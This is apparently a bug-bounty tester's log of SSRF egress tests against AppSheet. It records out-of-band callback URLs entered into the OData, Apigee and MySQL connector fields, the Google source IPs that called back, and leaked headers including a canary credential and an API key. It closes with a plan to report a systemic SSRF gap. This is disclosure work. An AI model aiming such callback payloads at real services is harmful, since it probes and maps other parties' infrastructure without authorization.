# Egress-Gap Test Log — AppSheet (Pi, Session 3 — 2026-06-16)

| test_id | surface | payload_url | oob_hit | src_ip | src_org | method+path | leaked_headers | client_fp | redirect_followed | verdict | ts_utc |
|---------|---------|-------------|---------|--------|---------|-------------|----------------|-----------|-------------------|---------|--------|
| T1 | OData data connector (`Account → Add OData connection information → Test`) | `https://d8orfta69r82mdenbp8gfswz8ppxcwd6z.oast.pro/probe-T1` | YES | `35.203.182.241` | Google Cloud Platform (GCP) | `GET /$metadata HTTP/1.1` | `Authorization: Basic Y2FuYXJ5OmNhbmFyeQ==` (canary:canary), `Traceparent: 00-0c8e50f9dbef2c8e1ed19c52570f68e0-5ca09006c9d17de0-00` | `Accept: application/xml; charset=utf-8, application/atom+xml; charset=utf-8` — Microsoft.OData.Client | n/a | **EGRESS-GAP** | 2026-06-16 20:56:44 UTC |
| T2 | Apigee API connector (`Account → Add Apigee API connection information → OpenAPI Spec URL → Validate`) | `https://d8orfta69r82mdenbp8gfswz8ppxcwd6z.oast.pro` | YES | `35.233.152.59` | Google Cloud Platform (GCP) | `GET / HTTP/1.1` | `X-Apikey: Ahsisjsshsgyssuwhehdidieuwwysu`, `Traceparent: 00-1d9706d9ddd9d0953779f8b8de0b8b55-ed79f904caf14ece-00`, `Cache-Control: no-cache` | No OData headers — distinct HTTP client | n/a | **EGRESS-GAP** | 2026-06-16 20:59:14 UTC |
| T3 | Image column | — | — | — | — | — | — | — | — | PENDING | — |
| T4 | PDF/email template | — | — | — | — | — | — | — | — | PENDING | — |
| T5 | Cloud Database connector — MySQL (`Account → Add database connection information → MySQL → Server: <OOB> → Test`) | `d8qjsaa69r8bl9bvgga06dddkcnydprf7.oast.pro` (Server field, no port) | YES (DNS oracle) | `172.217.46.248`, `172.217.46.242`, `192.178.118.92`, `192.178.118.80` + 11 more Google resolver IPs | Google (AS15169 — `172.217.x`, `192.178.x` ranges) | DNS A+AAAA queries (15 total); TCP connect to port 3306 attempted → "Failed to connect to database" | None leaked (DNS-only proof; TCP failed before DB handshake) | Separate database TCP client — distinct from all HTTP clients (OData, Apigee) | n/a | **EGRESS-GAP** (DNS oracle) | 2026-06-19 13:05:04–13:05:08 UTC |
| T6 | Webhook automation (paid plan required) | — | — | — | — | — | — | — | — | SKIP (free plan) | — |
| T7 | Staging/REST tie-in | — | — | — | — | — | — | — | — | PENDING | — |

## Decision matrix result
≥2 surfaces EGRESS-GAP → **Submit consolidated "Systemic SSRF egress-control gap" report (F003).**
F002 (OData-only) retained as standalone fallback.
